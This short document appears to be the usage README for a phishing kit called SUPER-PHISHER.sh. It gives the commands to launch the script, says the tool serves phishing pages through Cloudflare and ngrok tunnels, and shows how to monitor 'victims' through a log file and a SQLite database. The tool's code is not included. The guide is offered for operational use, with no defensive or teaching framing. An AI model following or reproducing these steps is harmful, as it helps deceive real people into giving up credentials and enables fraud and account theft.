# 1. Make it executable
cd Shells
chmod +x SUPER-PHISHER.sh

# 2. Run it
./SUPER-PHISHER.sh

# That's it! The tool does everything automatically
🎯 What happens when you run it:
Self-healing - Fixes all dependencies automatically

Web server starts - Creates phishing pages

Tunnels launch - Generates 4 different URLs:

🌐 Cloudflare URL

🔧 Ngrok URL

💻 Localhost:8080

📱 Your-IP:8080

Monitoring starts - Watch victims connect in real-time

🛑 To stop:
bash
Press Ctrl+C
📊 Check results:
bash
# Live monitoring
tail -f logs/victims.log

# Database
sqlite3 logs/victims.db
